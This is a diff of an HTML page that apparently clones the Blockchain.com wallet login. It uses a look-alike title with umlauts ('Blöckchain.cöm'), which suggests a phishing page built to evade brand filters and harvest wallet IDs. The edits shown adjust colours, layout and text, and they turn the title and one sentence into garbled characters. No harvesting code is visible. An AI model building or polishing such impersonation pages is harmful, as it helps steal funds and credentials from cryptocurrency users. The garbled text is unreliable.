@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en" data-kantu="1"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Blöckchain.cöm Wallet - Exchänge Cryptöcurrency</title>
+    <title>Blï¿½ckchain.cï¿½m Wallet - Exchï¿½nge Cryptï¿½currency</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="shortcut icon" href="/custom/img/favicon.ico">
@@ -21,7 +21,7 @@
     <div class="container-fluid">
 
         <div class="sc-bnXvFD dDillI">
-            <div style="height:90px;" class="col-md-12">
+            <div style="height:112px;" class="col-md-12">
                 <div class="sc-cmthru buGjPd sc-gHboQg hnSMth">
                     <div class="sc-hMFtBS gZupyF">
                         <div class="sc-eerKOB cTWApN" style="display: flex;flex-direction: column;">
@@ -59,7 +59,7 @@
                             </div>
                             <div class="sc-htoDjs fJbVHw sc-dBaXSw kzXGfH">
                                 <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw ivvLkX">
-                                    <span>Your Wallet ID can be found at the bottom of any email we’ve ever sent you. Need a reminder?</span>
+                                    <span>Your Wallet ID can be found at the bottom of any email weï¿½ve ever sent you. Need a reminder?</span>
                                     <a color="blue600" class="sc-bZQynM hVIpLu" href=#">
                                         <span>Send my Wallet ID</span>
                                     </a>
@@ -251,7 +251,7 @@
             src: url(./custom/font/Inter-Bold-a7dc5794cd7b07663ab2b8bcf96c0373.otf);
         }
         body{
-            background-color: rgb(13, 53, 120);
+            background-color: rgb(18, 29, 51);
             height: auto;
             min-height: 100%;
             width: 100%;
@@ -264,7 +264,7 @@
             display: flex;
             flex-direction: row;
             -webkit-box-pack: justify;
-            justify-content: space-between;
+            justify-content: center;
             -webkit-box-align: center;
             align-items: center;
             width: 100%;
